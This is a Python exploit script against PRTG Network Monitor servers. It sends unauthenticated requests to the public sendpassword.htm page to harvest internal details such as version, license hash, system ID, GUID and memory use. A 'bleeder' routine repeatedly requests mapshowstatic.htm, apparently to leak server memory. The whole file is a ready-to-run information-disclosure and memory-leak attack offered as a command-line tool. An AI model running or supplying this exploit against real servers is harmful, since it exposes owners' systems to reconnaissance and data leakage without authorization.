import re
import requests as r
import argparse
import urllib3

urllib3.disable_warnings()


def getInfo(url = 'http://127.0.0.1/'):
	for request in ['serverhttpurl','dnsname', 'edition','activated',
	'version','activationcolor','activesessions','windowsversion',
	'systemid','GUID','prtghost','loadvaluelookups','activationtime',
	'maintenancedate','startinfo','probes',
	'messagecount','lastsync','rawbuffercount','warnings',
	'probewarnings','repruncount','editiontype','daysinstalled',
	'commercialdaysleft','changepassword','licensehash', 'cpuload']:
		try:
			if url[-1] != '/':
				url += "/"
			Handler = r.get('{}public/sendpassword.htm?type={}'.format(url, request), verify=False)
			for line in Handler.text.split('\n'):
				if '<title>' in line:
					if "nbsp" not in line:
						print ("{} : {}".format(request, line.split('|')[1].replace("</title>","").replace("<ul><li>", "").replace("</li></ul>", "")))
					elif "<small>(" in line:
						pass
					else:
						print ("{} : {}".format(request, line.split('|')[0].replace("<title>","").replace("&nbsp;", "").replace("<small>(","").replace(")</small>", "").replace("<ul><li>", "").replace("</li></ul>", "")))	
		except:
			pass

	try:
		Handler = r.get('{}public/sendpassword.htm?type=memory'.format(url, request), verify=False)
		print ("{} : {}".format('Memory', Handler.text.split('\n')[20].split('|')[1].replace("</title>","").replace("<ul><li>", "").replace("</li></ul>", "").replace('</span><span>', " :").replace('<span>', '\n\t').replace("</span></li><li>", "").replace("</span>", "")))
	except:
		pass

def bleeder(url = 'http://127.0.0.1/', count = 1):
	for i in range(1,count+1):
		Handler = r.get('{}/public/mapshowstatic.htm?type=screenshot&nofile=true&what=s'.format(url), verify=False)
		print (Handler.text[20])
		if len(Handler.text) > 10 :
			print (Handler.text)
if __name__=='__main__':
	parser = argparse.ArgumentParser(description='Get Information From PRTG Server.')
	parser.add_argument('--url', type=str,
                    help='The URL of the Server', default="http://127.0.1/")
	parser.add_argument('--count', type=int,
                    default=0 , help='Number of requests')
	args = parser.parse_args()
	if args.count > 0 :
		bleeder(args.url, args.count)
	getInfo(args.url)
	
